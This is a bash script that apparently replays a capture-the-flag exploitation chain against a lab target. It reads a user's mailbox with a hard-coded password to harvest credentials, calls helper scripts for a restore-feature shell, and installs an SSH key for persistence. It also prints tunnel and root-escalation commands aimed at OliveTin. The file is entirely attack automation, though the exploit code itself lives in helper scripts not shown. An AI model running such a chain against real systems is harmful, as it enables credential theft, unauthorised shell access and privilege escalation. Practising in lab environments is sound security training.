#!/usr/bin/env bash
# Replay chain (needs /etc/hosts + VPN). Does not mount NFS — run showmount/mount manually.
set -euo pipefail

IP="${1:-}"
if [[ -z "$IP" ]]; then
  echo "Usage: $0 <target_ip>" >&2
  exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[1] IMAP sarah (expect creds in mail)..."
python3 "$SCRIPT_DIR/imap_read_inbox.py" "$IP" sarah 'Enigma2024!' | head -80

echo "[2] OpenSTA restore shell..."
"$SCRIPT_DIR/osm_restore_shell.sh" "$IP"

echo "[3] Install SSH key (optional)..."
if [[ -f "$HOME/.ssh/id_ed25519_htb.pub" ]]; then
  "$SCRIPT_DIR/install_ssh_key.sh" "$IP" || true
fi

echo "[4] OliveTin root (start tunnel in another terminal if needed):"
echo "    ssh -i ~/.ssh/id_ed25519_htb -L 13337:127.0.0.1:1337 haris@${IP} -N -f"
echo "    python3 $SCRIPT_DIR/olivetin_root.py"